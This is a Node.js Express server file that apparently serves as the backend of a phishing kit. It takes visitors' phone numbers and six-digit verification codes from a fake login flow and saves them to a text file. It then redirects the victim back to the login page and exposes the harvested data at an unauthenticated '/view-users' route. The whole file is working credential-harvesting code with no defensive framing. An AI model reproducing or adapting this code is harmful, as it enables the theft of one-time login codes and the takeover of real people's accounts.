const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('.')); // Serve static files from current directory

// Ensure users.txt exists
const usersFile = path.join(__dirname, 'users.txt');
if (!fs.existsSync(usersFile)) {
  fs.writeFileSync(usersFile, '');
}

// Handle POST request from login form
app.post('/post.php', (req, res) => {
  const { country_code, phone } = req.body;
  const timestamp = new Date().toISOString();
  const fullPhone = `${country_code}${phone}`;
  
  // Format the data
  const userData = `Timestamp: ${timestamp}\nPhone Number: ${fullPhone}\n${'='.repeat(50)}\n`;
  
  // Use writeFile synchronously to ensure it completes before redirect
  try {
    fs.appendFileSync(usersFile, userData);
    console.log('Phone number saved:', { phone: fullPhone, timestamp });
    
    // Redirect to verification page after successful write
    res.redirect('/verification.html');
  } catch (err) {
    console.error('Error writing to file:', err);
    return res.status(500).send('Error saving data');
  }
});

// Handle POST request from verification form
app.post('/verify-code', (req, res) => {
  const { digit1, digit2, digit3, digit4, digit5, digit6 } = req.body;
  const code = `${digit1}${digit2}${digit3}${digit4}${digit5}${digit6}`;
  const timestamp = new Date().toISOString();
  
  // Format the verification code data
  const codeData = `Timestamp: ${timestamp}\nVerification Code: ${code}\n${'='.repeat(50)}\n`;
  
  // Use writeFile synchronously to ensure it completes before redirect
  try {
    fs.appendFileSync(usersFile, codeData);
    console.log('Verification code saved:', { code, timestamp });
    
    // Redirect back to login page after successful write
    res.redirect('/');
  } catch (err) {
    console.error('Error writing to file:', err);
    return res.status(500).send('Error saving data');
  }
});

// Optional: View all saved users (for testing)
app.get('/view-users', (req, res) => {
  fs.readFile(usersFile, 'utf8', (err, data) => {
    if (err) {
      return res.status(500).send('Error reading file');
    }
    res.type('text/plain').send(data || 'No users saved yet.');
  });
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`Users will be saved to: ${usersFile}`);
});
